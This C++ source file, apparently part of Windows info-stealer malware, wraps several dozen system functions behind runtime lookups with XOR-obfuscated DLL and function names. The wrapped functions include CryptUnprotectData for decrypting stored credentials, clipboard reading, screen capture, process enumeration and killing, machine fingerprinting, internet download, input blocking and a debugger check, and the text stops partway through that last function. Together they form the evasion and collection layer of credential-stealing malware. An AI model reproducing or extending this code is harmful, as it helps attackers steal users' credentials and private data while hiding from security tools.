#include "winapi.h"

#include "../utilities/xor/xor.h"

windows_api g_winapi;

FARPROC WINAPI windows_api::_GetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
	typedef FARPROC(WINAPI* getprocaddress_t)(HMODULE hModule, LPCSTR lpProcName);
	LPVOID to_addr = GetProcAddress(LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("GetProcAddress"));
	getprocaddress_t getprocaddress = (getprocaddress_t)to_addr;
	return getprocaddress(hModule, lpProcName);
}

HMODULE WINAPI windows_api::_LoadLibraryA(LPCSTR lpLibFileName) {
	typedef HMODULE(WINAPI* loadlibrary_t)(LPCSTR lpLibFileName);
	LPVOID to_addr = _GetProcAddress(LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("LoadLibraryA"));
	loadlibrary_t loadlibrary = (loadlibrary_t)to_addr;
	return loadlibrary(lpLibFileName);
}

HINTERNET WINAPI windows_api::InternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType,
	LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags) {

	typedef HINTERNET(WINAPI* internetopen_t)(LPCSTR lpszAgent, DWORD dwAccessType,
		LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("wininet.dll")), XOR_STRING("InternetOpenA"));
	internetopen_t internet_open = (internetopen_t)to_addr;
	return internet_open(lpszAgent, dwAccessType, lpszProxy, lpszProxyBypass, dwFlags);
}

HINTERNET WINAPI windows_api::InternetConnectA(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort,
	LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext) {

	typedef HINTERNET(WINAPI* internetconnect_t)(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort,
		LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("wininet.dll")), XOR_STRING("InternetConnectA"));
	internetconnect_t internet_connect = (internetconnect_t)to_addr;
	return internet_connect(hInternet, lpszServerName, nServerPort, lpszUserName, lpszPassword, dwService, dwFlags, dwContext);
}

HINTERNET WINAPI windows_api::InternetOpenUrlA(HINTERNET hInternet, LPCSTR lpszUrl, LPCSTR lpszHeaders,
	DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext) {

	typedef HINTERNET(WINAPI* internetopenurl_t)(HINTERNET hInternet, LPCSTR lpszUrl, LPCSTR lpszHeaders,
		DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("wininet.dll")), XOR_STRING("InternetOpenUrlA"));
	internetopenurl_t internetopenurl = (internetopenurl_t)to_addr;
	return internetopenurl(hInternet, lpszUrl, lpszHeaders,
		dwHeadersLength, dwFlags, dwContext);
}

BOOL WINAPI windows_api::InternetReadFile(HINTERNET hFile, LPVOID lpBuffer,
	DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead) {

	typedef BOOL(WINAPI* internetreadfile_t)(HINTERNET hFile, LPVOID lpBuffer,
		DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("wininet.dll")), XOR_STRING("InternetReadFile"));
	internetreadfile_t internetreadfile = (internetreadfile_t)to_addr;
	return internetreadfile(hFile, lpBuffer,
		dwNumberOfBytesToRead, lpdwNumberOfBytesRead);
}

BOOL WINAPI windows_api::InternetCloseHandle(HINTERNET hInternet) {
	
	typedef BOOL(WINAPI* internetclosehandle_t)(HINTERNET hInternet);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("wininet.dll")), XOR_STRING("InternetCloseHandle"));
	internetclosehandle_t internetclosehandle = (internetclosehandle_t)to_addr;
	return internetclosehandle(hInternet);
}

VOID WINAPI windows_api::GetSystemInfo(LPSYSTEM_INFO lpSystemInfo) {

	typedef VOID(WINAPI* getsysteminfo_t)(LPSYSTEM_INFO lpSystemInfo);

	LPVOID func_address = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("GetSystemInfo"));
	getsysteminfo_t get_system_info = (getsysteminfo_t)func_address;
	return get_system_info(lpSystemInfo);
}

BOOL WINAPI windows_api::CopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists) {

	typedef BOOL(WINAPI* copyfile_t)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);

	LPVOID func_address = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("CopyFileA"));
	copyfile_t copyfile = (copyfile_t)func_address;
	return copyfile(lpExistingFileName, lpNewFileName, bFailIfExists);
}

HANDLE WINAPI windows_api::CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {

	typedef HANDLE(WINAPI* createfilea_t)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
		LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);

	LPVOID func_address = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("CreateFileA"));
	createfilea_t create_file_a = (createfilea_t)func_address;
	return create_file_a(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes,
		dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
}

BOOL WINAPI windows_api::WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, 
	LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped) {

	typedef BOOL(WINAPI* writefile_t)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite,
		LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("WriteFile"));
	writefile_t writefile = (writefile_t)to_addr;
	return writefile(hFile, lpBuffer, nNumberOfBytesToWrite,
		lpNumberOfBytesWritten, lpOverlapped);
}

ULONG WINAPI windows_api::GetAdaptersInfo(IP_ADAPTER_INFO AdapterInfo, PULONG SizePointer) {

	typedef ULONG(WINAPI* getadapterinfo_t)(IP_ADAPTER_INFO AdapterInfo, PULONG SizePointer);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("iphlpapi.dll")), XOR_STRING("GetAdaptersInfo"));
	getadapterinfo_t getadapterinfo = (getadapterinfo_t)to_addr;
	return getadapterinfo(AdapterInfo, SizePointer);
}

BOOL WINAPI windows_api::CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment,
	LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation) {

	typedef BOOL(WINAPI* createprocess_t)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
		LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("CreateProcessA"));
	createprocess_t createprocess = (createprocess_t)to_addr;
	return createprocess(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes,
		bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
}

DWORD WINAPI windows_api::WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds) {

	typedef DWORD(WINAPI* waitforsingleobject_t)(HANDLE hHandle, DWORD dwMilliseconds);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("WaitForSingleObject"));
	waitforsingleobject_t waitforsingleobject = (waitforsingleobject_t)to_addr;
	return waitforsingleobject(hHandle, dwMilliseconds);
}

BOOL WINAPI windows_api::CloseHandle(HANDLE hObject) {

	typedef BOOL(WINAPI* closehandle_t)(HANDLE hObject);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("CloseHandle"));
	closehandle_t closehandle = (closehandle_t)to_addr;
	return closehandle(hObject);
}

DWORD WINAPI windows_api::GetEnvironmentVariableA(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize) {

	typedef DWORD(WINAPI* getenvironmentvariable_t)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("GetEnvironmentVariableA"));
	getenvironmentvariable_t getenvironmentvariable = (getenvironmentvariable_t)to_addr;
	return getenvironmentvariable(lpName, lpBuffer, nSize);
}

HMODULE WINAPI windows_api::GetModuleHandleA(LPCSTR lpModuleName) {

	typedef HMODULE(WINAPI* getmodulehandle_t)(LPCSTR lpModuleName);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("GetModuleHandleA"));
	getmodulehandle_t getmodulehandle = (getmodulehandle_t)to_addr;
	return getmodulehandle(lpModuleName);
}

BOOL WINAPI windows_api::BlockInput(BOOL parameter) {

	typedef BOOL(WINAPI* blockinput_t)(BOOL fBlockIt);
	// This is favorite function of developer

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("User32.dll")), XOR_STRING("BlockInput"));
	blockinput_t block_input = (blockinput_t)to_addr;
	return block_input(parameter);
}

DWORD WINAPI windows_api::GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize) {

	typedef DWORD(WINAPI* getmodulefilename_t)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("GetModuleFileNameA"));
	getmodulefilename_t getmodulefilename = (getmodulefilename_t)to_addr;
	return getmodulefilename(hModule, lpFilename, nSize);
}

BOOL WINAPI windows_api::EnumDisplayDevicesA(LPCSTR lpDevice, DWORD iDevNum, PDISPLAY_DEVICEA lpDisplayDevice, DWORD dwFlags) {

	typedef BOOL(WINAPI* enumdisplaydevices_t)(LPCSTR lpDevice, DWORD iDevNum, PDISPLAY_DEVICEA lpDisplayDevice, DWORD dwFlags);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("User32.dll")), XOR_STRING("EnumDisplayDevicesA"));
	enumdisplaydevices_t enumdisplaydevices = (enumdisplaydevices_t)to_addr;
	return enumdisplaydevices(lpDevice, iDevNum, lpDisplayDevice, dwFlags);
}

VOID WINAPI windows_api::Sleeping(DWORD dwMilliseconds) {

	typedef VOID(WINAPI* sleepingmode_t)(DWORD dwMilliseconds);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("Sleep"));
	sleepingmode_t sleepingmode = (sleepingmode_t)to_addr;
	return sleepingmode(dwMilliseconds);
}

BOOL WINAPI windows_api::ShowWindow(HWND hWnd, int nCmdShow) {

	typedef BOOL(WINAPI* showwindow_t)(HWND hWnd, int nCmdShow);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("User32.dll")), XOR_STRING("ShowWindow"));
	showwindow_t showwindow = (showwindow_t)to_addr;
	return showwindow(hWnd, nCmdShow);
}

BOOL WINAPI windows_api::GetComputerNameA(LPSTR lpBuffer, LPDWORD nSize) {

	typedef BOOL(WINAPI* getcompname_t)(LPSTR lpBuffer, LPDWORD nSize);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("GetComputerNameA"));
	getcompname_t getcompname = (getcompname_t)to_addr;
	return getcompname(lpBuffer, nSize);
}

BOOL WINAPI windows_api::InternetCheckConnectionA(LPCSTR lpszUrl, DWORD dwFlags, DWORD dwReserved) {

	typedef BOOL(WINAPI* internetcheckconnection_t)(LPCSTR lpszUrl, DWORD dwFlags, DWORD dwReserved);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("wininet.dll")), XOR_STRING("InternetCheckConnectionA"));
	internetcheckconnection_t internetcheckconnection = (internetcheckconnection_t)to_addr;

	return internetcheckconnection(lpszUrl, dwFlags, dwReserved);
}

DWORD WINAPI windows_api::GetModuleBaseNameA(HANDLE hProcess, HMODULE hModule, LPSTR lpBaseName, DWORD nSize) {

	typedef DWORD(WINAPI* getmodulebasename_t)(HANDLE hProcess, HMODULE hModule, LPSTR lpBaseName, DWORD nSize);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("GetModuleBaseNameA"));
	getmodulebasename_t getmodulebasename = (getmodulebasename_t)to_addr;
	return getmodulebasename(hProcess, hModule, lpBaseName, nSize);
}

BOOL WINAPI windows_api::GlobalMemoryStatusEx(LPMEMORYSTATUSEX lpBuffer) {

	typedef BOOL(WINAPI* globalmemorystatusex_t)(LPMEMORYSTATUSEX lpBuffer);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("GlobalMemoryStatusEx"));
	globalmemorystatusex_t globalmemorystatusex = (globalmemorystatusex_t)to_addr;
	return globalmemorystatusex(lpBuffer);
}

HANDLE WINAPI windows_api::CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID) {

	typedef HANDLE(WINAPI* CreateToolhelp32Snapshot_t)(DWORD dwFlags, DWORD th32ProcessID);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("CreateToolhelp32Snapshot"));
	CreateToolhelp32Snapshot_t CreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t)to_addr;
	return CreateToolhelp32Snapshot(dwFlags, th32ProcessID);
}

BOOL WINAPI windows_api::Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) {

	typedef BOOL(WINAPI* process32first_t)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("Process32First"));
	process32first_t process32first = (process32first_t)to_addr;
	return process32first(hSnapshot, lppe);
}

BOOL WINAPI windows_api::Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) {

	typedef BOOL(WINAPI* process32next_t)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("Process32Next"));
	process32next_t process32next = (process32next_t)to_addr;
	return process32next(hSnapshot, lppe);
}

HANDLE WINAPI windows_api::OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) {

	typedef HANDLE(WINAPI* openprocess_t)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("OpenProcess"));
	openprocess_t openprocess = (openprocess_t)to_addr;
	return openprocess(dwDesiredAccess, bInheritHandle, dwProcessId);
}

BOOL WINAPI windows_api::TerminateProcess(HANDLE hProcess, UINT uExitCode) {

	typedef BOOL(WINAPI* terminateprocess_t)(HANDLE hProcess, UINT uExitCode);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("TerminateProcess"));
	terminateprocess_t terminateprocess = (terminateprocess_t)to_addr;
	return terminateprocess(hProcess, uExitCode);
}

BOOL WINAPI windows_api::OpenClipboard(HWND hWndNewOwner) {

	typedef BOOL(WINAPI* openclipboard_t)(HWND hWndNewOwner);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("User32.dll")), XOR_STRING("OpenClipboard"));
	openclipboard_t openclipboard = (openclipboard_t)to_addr;
	return openclipboard(hWndNewOwner);
}

HANDLE WINAPI windows_api::GetClipboardData(UINT uFormat) {

	typedef HANDLE(WINAPI* getclipboarddata_t)(UINT uFormat);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("User32.dll")), XOR_STRING("GetClipboardData"));
	getclipboarddata_t getclipboarddata = (getclipboarddata_t)to_addr;
	return getclipboarddata(uFormat);
}

LPVOID WINAPI windows_api::GlobalLock(HGLOBAL hMem) {

	typedef LPVOID(WINAPI* globallock_t)(HGLOBAL hMem);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("GlobalLock"));
	globallock_t globallock = (globallock_t)to_addr;
	return globallock(hMem);
}

BOOL WINAPI windows_api::GlobalUnlock(HGLOBAL hMem) {

	typedef BOOL(WINAPI* globalunlock_t)(HGLOBAL hMem);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("GlobalUnlock"));
	globalunlock_t globalunlock = (globalunlock_t)to_addr;
	return globalunlock(hMem);
}

BOOL WINAPI windows_api::CloseClipboard(VOID) {

	typedef BOOL(WINAPI* closeclipboard_t)(VOID);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("User32.dll")), XOR_STRING("CloseClipboard"));
	closeclipboard_t closeclipboard = (closeclipboard_t)to_addr;
	return closeclipboard();
}

HWND WINAPI windows_api::GetDesktopWindow(VOID) {

	typedef BOOL(WINAPI* getdesktopwindow_t)(VOID);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("User32.dll")), XOR_STRING("GetDesktopWindow"));
	getdesktopwindow_t getdesktopwindow = (getdesktopwindow_t)to_addr;
	return (HWND)getdesktopwindow();
}

BOOL WINAPI windows_api::GetWindowRect(HWND hWnd, LPRECT lpRect) {

	typedef BOOL(WINAPI* getwindowrect_t)(HWND hWnd, LPRECT lpRect);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("User32.dll")), XOR_STRING("GetWindowRect"));
	getwindowrect_t getwindowrect = (getwindowrect_t)to_addr;
	return getwindowrect(hWnd, lpRect);
}

HANDLE WINAPI windows_api::FindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData) {

	typedef HANDLE(WINAPI* findfirstfile_t)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("FindFirstFileA"));
	findfirstfile_t findfirstfile = (findfirstfile_t)to_addr;
	return findfirstfile(lpFileName, lpFindFileData);
}

BOOL WINAPI windows_api::FindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData) {

	typedef BOOL(WINAPI* findnextfile_t)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("FindNextFileA"));
	findnextfile_t findnextfile = (findnextfile_t)to_addr;
	return findnextfile(hFindFile, lpFindFileData);
}

BOOL WINAPI windows_api::FindClose(HANDLE hFindFile) {

	typedef BOOL(WINAPI* findclose_t)(HANDLE hFindFile);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("FindClose"));
	findclose_t findclose = (findclose_t)to_addr;
	return findclose(hFindFile);
}

BOOL WINAPI windows_api::GetCursorPos(LPPOINT lpPoint) {

	typedef BOOL(WINAPI* getcursorpos_t)(LPPOINT lpPoint);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("User32.dll")), XOR_STRING("GetCursorPos"));
	getcursorpos_t getcursorpos = (getcursorpos_t)to_addr;
	return getcursorpos(lpPoint);
}

PSTR WINAPI windows_api::StrStrA(PCSTR pszFirst, PCSTR pszSrch) {

	typedef PSTR(WINAPI* strstr_t)(PCSTR pszFirst, PCSTR pszSrch);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Shlwapi.dll")), XOR_STRING("StrStrA"));
	strstr_t strstr = (strstr_t)to_addr;
	return strstr(pszFirst, pszSrch);
}

HINSTANCE WINAPI windows_api::ShellExecuteA(HWND hwnd, LPCSTR lpOperation,
	LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd) {

	typedef HINSTANCE(WINAPI* shellexecute_t)(HWND hwnd, LPCSTR lpOperation,
		LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Shell32.dll")), XOR_STRING("ShellExecuteA"));
	shellexecute_t shellexecute = (shellexecute_t)to_addr;
	return shellexecute(hwnd, lpOperation, lpFile, lpParameters, lpDirectory, nShowCmd);
}

BOOL WINAPI windows_api::CryptUnprotectData(DATA_BLOB* pDataIn, LPWSTR* ppszDataDescr, DATA_BLOB* pOptionalEntropy,
	PVOID pvReserved, CRYPTPROTECT_PROMPTSTRUCT* pPromptStruct, DWORD dwFlags, DATA_BLOB* pDataOut) {
	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Crypt32.dll")), XOR_STRING("CryptUnprotectData"));

	typedef BOOL(WINAPI* cryptunprotectdata_t)(DATA_BLOB* pDataIn, LPWSTR* ppszDataDescr, DATA_BLOB* pOptionalEntropy,
	PVOID pvReserved, CRYPTPROTECT_PROMPTSTRUCT* pPromptStruct, DWORD dwFlags, DATA_BLOB* pDataOut);

	cryptunprotectdata_t cryptunprotectdata = (cryptunprotectdata_t)to_addr;
	return cryptunprotectdata(pDataIn, ppszDataDescr, pOptionalEntropy,
		pvReserved, pPromptStruct, dwFlags, pDataOut);
}

BOOL WINAPI windows_api::GetVersionExA(LPOSVERSIONINFOA lpVersionInformation) {

	typedef BOOL(WINAPI* getversionex_t)(LPOSVERSIONINFOA lpVersionInformation);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("GetVersionExA"));
	getversionex_t getversionex = (getversionex_t)to_addr;
	return getversionex(lpVersionInformation);
}

BOOL WINAPI windows_api::OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle) {

	typedef BOOL(WINAPI* openprocesstoken_t)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Advapi32.dll")), XOR_STRING("OpenProcessToken"));
	openprocesstoken_t openprocesstoken = (openprocesstoken_t)to_addr;
	return openprocesstoken(ProcessHandle, DesiredAccess, TokenHandle);
}

HANDLE WINAPI windows_api::GetCurrentProcess(VOID) {

	typedef HANDLE(WINAPI* getcurrentprocess_t)(VOID);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("GetCurrentProcess"));
	getcurrentprocess_t getcurrentprocess = (getcurrentprocess_t)to_addr;
	return getcurrentprocess();
}

BOOL WINAPI windows_api::GetCurrentHwProfileA(LPHW_PROFILE_INFOA lpHwProfileInfo) {

	typedef BOOL(WINAPI* getcurrentprofile_t)(LPHW_PROFILE_INFOA lpHwProfileInfo);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Advapi32.dll")), XOR_STRING("GetCurrentHwProfileA"));
	getcurrentprofile_t getcurrentprofile = (getcurrentprofile_t)to_addr;
	return getcurrentprofile(lpHwProfileInfo);
}

BOOL WINAPI windows_api::DeleteFileA(LPCSTR lpFileName) {

	typedef BOOL(WINAPI* deletefile_t)(LPCSTR lpFileName);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("DeleteFileA"));
	deletefile_t deletefile = (deletefile_t)to_addr;
	return deletefile(lpFileName);
}

int WINAPI windows_api::GetSystemMetrics(int nIndex) {

	typedef int(WINAPI* getsystemmetrics_t)(int nIndex);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("User32.dll")), XOR_STRING("GetSystemMetrics"));
	getsystemmetrics_t getsystemmetrics = (getsystemmetrics_t)to_addr;
	return getsystemmetrics(nIndex);
}

HDC WINAPI windows_api::CreateCompatibleDC(HDC hdc) {

	typedef HDC(WINAPI* createcompatibledc_t)(HDC hdc);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Gdi32.dll")), XOR_STRING("CreateCompatibleDC"));
	createcompatibledc_t createcompatibledc = (createcompatibledc_t)to_addr;
	return createcompatibledc(hdc);
}

HBITMAP WINAPI windows_api::CreateCompatibleBitmap(HDC hdc, int cx, int cy) {

	typedef HBITMAP(WINAPI* createcompatiblebitmap_t)(HDC hdc, int cx, int cy);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Gdi32.dll")), XOR_STRING("CreateCompatibleBitmap"));
	createcompatiblebitmap_t createcompatiblebitmap = (createcompatiblebitmap_t)to_addr;
	return createcompatiblebitmap(hdc, cx, cy);
}

HGDIOBJ WINAPI windows_api::SelectObject(HDC hdc, HGDIOBJ h) {

	typedef HGDIOBJ(WINAPI* selectobject_t)(HDC hdc, HGDIOBJ h);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Gdi32.dll")), XOR_STRING("SelectObject"));
	selectobject_t selectobject = (selectobject_t)to_addr;
	return selectobject(hdc, h);
}

BOOL WINAPI windows_api::BitBlt(HDC hdc, int x, int y, int cx, int cy, HDC hdcSrc, int x1, int y1, DWORD rop) {

	typedef BOOL(WINAPI* bitbit_t)(HDC hdc, int x, int y, int cx, int cy, HDC hdcSrc, int x1, int y1, DWORD rop);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Gdi32.dll")), XOR_STRING("BitBlt"));
	bitbit_t bitbit = (bitbit_t)to_addr;
	return bitbit(hdc, x, y, cx, cy, hdcSrc, x1, y1, rop);
}

BOOL WINAPI windows_api::DeleteDC(HDC hdc) {

	typedef BOOL(WINAPI* deletedc_t)(HDC hdc);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Gdi32.dll")), XOR_STRING("DeleteDC"));
	deletedc_t bitbit = (deletedc_t)to_addr;
	return bitbit(hdc);
}

BOOL WINAPI windows_api::DeleteObject(HGDIOBJ ho) {

	typedef BOOL(WINAPI* deleteobject_t)(HGDIOBJ ho);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Gdi32.dll")), XOR_STRING("DeleteObject"));
	deleteobject_t deleteobject = (deleteobject_t)to_addr;
	return deleteobject(ho);
}

int WINAPI windows_api::ReleaseDC(HWND hWnd, HDC hDC) {

	typedef int(WINAPI* releasedc_t)(HWND hWnd, HDC hDC);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("User32.dll")), XOR_STRING("ReleaseDC"));
	releasedc_t releasedc = (releasedc_t)to_addr;
	return releasedc(hWnd, hDC);
}

HLOCAL WINAPI windows_api::LocalFree(HLOCAL hMem) {

	typedef HLOCAL(WINAPI* localfree_t)(HLOCAL hMem);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("LocalFree"));
	localfree_t localfree = (localfree_t)to_addr;
	return localfree(hMem);
}

int WINAPI windows_api::GetLocaleInfoA(LCID Locale, LCTYPE LCType, LPSTR lpLCData, int cchData) {

	typedef int(WINAPI* getlocaleinfo_t)(LCID Locale, LCTYPE LCType, LPSTR lpLCData, int cchData);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("GetLocaleInfoA"));
	getlocaleinfo_t getlocaleinfo = (getlocaleinfo_t)to_addr;
	return getlocaleinfo(Locale, LCType, lpLCData, cchData);
}

HANDLE WINAPI windows_api::CreateMutexA(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName) {

	typedef HANDLE(WINAPI* mutex_t)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("CreateMutexA"));
	mutex_t mutex = (mutex_t)to_addr;
	return mutex(lpMutexAttributes, bInitialOwner, lpName);
}

BOOL WINAPI windows_api::ReleaseMutex(HANDLE hMutex) {

	typedef BOOL(WINAPI* releasemutex_t)(HANDLE hMutex);

	LPVOID to_addr = _GetProcAddress(_LoadLibraryA(XOR_STRING("Kernel32.dll")), XOR_STRING("ReleaseMutex"));
	releasemutex_t releasemutex = (releasemutex_t)to_addr;
	return releasemutex(hMutex);
}

BOOL WINAPI windows_api::IsDebuggerPresent() {

	typedef BOOL(WINAPI* isdebuggerpresent_t)();

